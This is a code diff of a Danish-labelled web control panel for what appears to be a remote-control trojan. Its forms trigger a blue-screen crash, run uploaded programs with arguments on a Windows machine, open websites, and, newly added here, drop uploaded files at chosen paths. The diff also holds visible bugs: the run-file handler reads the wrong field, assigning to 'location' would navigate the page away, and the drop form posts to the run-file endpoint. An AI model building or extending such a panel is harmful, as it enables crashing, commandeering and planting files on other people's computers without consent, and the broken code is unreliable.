@@ -3,7 +3,7 @@
 <style>
     .sendButton {
         width: 150px;
-        height: 30px;
+        height: fit-content;
         color: black;
         font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
         cursor: pointer;
@@ -67,8 +67,8 @@
             <button class="sendButton" style="background-color: blue;" onclick="sendBSOD()">Start BSOD!</button>
             <h3 class="title">Kør fil</h3>
             <label class="label">Virker kun på windows!</label>
-            <form enctype="multipart/form-data" id="fileForm">
-                <input type="file" id="file" name="file">
+            <form enctype="multipart/form-data" id="runFileForm">
+                <input type="file" id="runfile" name="runfile">
                 <br>
                 <input type="text" id="args" name="args" placeholder="Argumenter til programmet">
                 <br><br>
@@ -88,6 +88,14 @@
             <br><br>
             <button class="sendButton" style="background-color: blueviolet;" onclick="sendWebsite()">Åbn
                 Hjemmeside!</button>
+            <h3 class="title">Drop fil</h3>
+            <form enctype="multipart/form-data" id="dropFileForm">
+                <input type="file" id="dropFile" name="dropFile">
+                <br>
+                <input type="text" id="location" name="location" placeholder="Sti til drop">
+                <br><br>
+                <input type="submit" class="sendButton" style="background-color: orange;" value="Send Fil!">
+            </form>
         </div>
 
         <script>
@@ -112,15 +120,37 @@
                 event.preventDefault();
             }
 
-            var fileForm = document.getElementById("fileForm");
-            fileForm.onsubmit = function (event) {
-                const fileForm = event.currentTarget;
-                const fileFormData = new FormData(fileForm);
+            var runFileForm = document.getElementById("runFileForm");
+            runFileForm.onsubmit = function (event) {
+                const runFileForm = event.currentTarget;
+                const runFileFormData = new FormData(runFileForm);
 
                 key = document.getElementById("key").value;
-                args = document.getElementById("args").value;
+                location = document.getElementById("location").value;
 
-                fetch(`${document.URL}/post_runfile?key=${key}&args=${args}`, { "method": "POST", "body": fileFormData })
+                fetch(`${document.URL}/post_runfile?key=${key}`, { "method": "POST", "body": runFileFormData })
+                    .then(response => {
+                        if (response.status == 200) {
+                            alert("Fil sendt!");
+                        } else if (response.status == 403) {
+                            alert("Forkert key!");
+                        } else {
+                            alert("Ukendt fejl!")
+                        }
+                    });
+
+                event.preventDefault();
+            }
+
+            var dropFileForm = document.getElementById("dropFileForm");
+            dropFileForm.onsubmit = function (event) {
+                const dropFileForm = event.currentTarget;
+                const dropFileFormData = new FormData(dropFileForm);
+
+                key = document.getElementById("key").value;
+                location = document.getElementById("location").value;
+
+                fetch(`${document.URL}/post_runfile?key=${key}&location=${location}`, { "method": "POST", "body": dropFileFormData })
                     .then(response => {
                         if (response.status == 200) {
                             alert("Fil sendt!");
